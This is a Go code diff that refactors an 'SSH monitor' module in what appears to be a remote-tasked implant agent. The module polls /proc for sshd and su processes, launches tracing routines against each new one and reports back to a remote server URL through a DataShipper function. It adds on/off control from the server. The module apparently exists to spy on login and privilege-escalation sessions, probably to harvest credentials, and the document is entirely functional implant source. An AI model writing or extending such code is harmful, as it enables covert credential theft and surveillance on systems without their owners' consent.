@@ -1,6 +1,9 @@
+//go:build linux
+
 package agent_helper
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"regexp"
@@ -10,8 +13,14 @@ import (
 	"time"
 )
 
-func findPids() []int {
-	var sshdPids []int
+var (
+	sshMonitorCancel context.CancelFunc
+	sshMonitorMu     sync.Mutex
+	sshMonitorActive bool
+)
+
+func findAllPids() []int {
+	var pids []int
 	currentPID := os.Getpid()
 	procDirs, err := os.ReadDir("/proc")
 	if err != nil {
@@ -21,11 +30,11 @@ func findPids() []int {
 		if dir.IsDir() {
 			pid, err := strconv.Atoi(dir.Name())
 			if err == nil && pid != currentPID {
-				sshdPids = append(sshdPids, pid)
+				pids = append(pids, pid)
 			}
 		}
 	}
-	return sshdPids
+	return pids
 }
 
 func isSSHPid(pid int) bool {
@@ -61,37 +70,79 @@ func isSUPid(pid int) bool {
 	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
-// this is your driver function
 func SSHMonitorHandler(serverUrl string, taskData map[string]interface{}) {
-	var processedFirstPID bool
+	args := strings.TrimSpace(strings.ToLower(taskData["args"].(string)))
+
+	sshMonitorMu.Lock()
+	defer sshMonitorMu.Unlock()
+
+	switch args {
+	case "on":
+		if sshMonitorActive {
+			DataShipper(serverUrl, taskData, "ssh monitor already running")
+			return
+		}
+		ctx, cancel := context.WithCancel(context.Background())
+		sshMonitorCancel = cancel
+		sshMonitorActive = true
+		go runSSHMonitor(ctx, serverUrl, taskData)
+		DataShipper(serverUrl, taskData, "ssh monitor started")
+	case "off":
+		if !sshMonitorActive {
+			DataShipper(serverUrl, taskData, "ssh monitor not running")
+			return
+		}
+		sshMonitorCancel()
+		sshMonitorActive = false
+		DataShipper(serverUrl, taskData, "ssh monitor stopped")
+	default:
+		DataShipper(serverUrl, taskData, "usage: ssh_monitor on|off")
+	}
+}
+
+func runSSHMonitor(ctx context.Context, serverUrl string, taskData map[string]interface{}) {
 	var processedPids []int
-	var processedPidsMutex sync.Mutex
+	var skippedFirstSSH, skippedFirstSU bool
 
 	for {
-		pids := findPids()
-		for _, pid := range pids {
-			processedPidsMutex.Lock()
-
-			if isSSHPid(pid) && (!processedFirstPID || !Contains(processedPids, pid)) {
-				if !processedFirstPID {
-					processedFirstPID = true
-				} else {
-					go traceSSHDProcess(serverUrl, taskData, pid)
-					processedPids = append(processedPids, pid)
-				}
-			}
-
-			if isSUPid(pid) && (!processedFirstPID || !Contains(processedPids, pid)) {
-				if !processedFirstPID {
-					processedFirstPID = true
-				} else {
-					go traceSUProcess(serverUrl, taskData, pid)
-					processedPids = append(processedPids, pid)
-				}
-			}
-
-			processedPidsMutex.Unlock()
+		select {
+		case <-ctx.Done():
+			return
+		default:
 		}
+
+		pids := findAllPids()
+
+		var activePids []int
+		for _, p := range processedPids {
+			if _, err := os.Stat(fmt.Sprintf("/proc/%d", p)); err == nil {
+				activePids = append(activePids, p)
+			}
+		}
+		processedPids = activePids
+
+		for _, pid := range pids {
+			if Contains(processedPids, pid) {
+				continue
+			}
+
+			if isSSHPid(pid) {
+				processedPids = append(processedPids, pid)
+				if !skippedFirstSSH {
+					skippedFirstSSH = true
+					continue
+				}
+				go traceSSHDProcess(ctx, serverUrl, taskData, pid)
+			} else if isSUPid(pid) {
+				processedPids = append(processedPids, pid)
+				if !skippedFirstSU {
+					skippedFirstSU = true
+					continue
+				}
+				go traceSUProcess(ctx, serverUrl, taskData, pid)
+			}
+		}
+
 		time.Sleep(250 * time.Millisecond)
 	}
 }
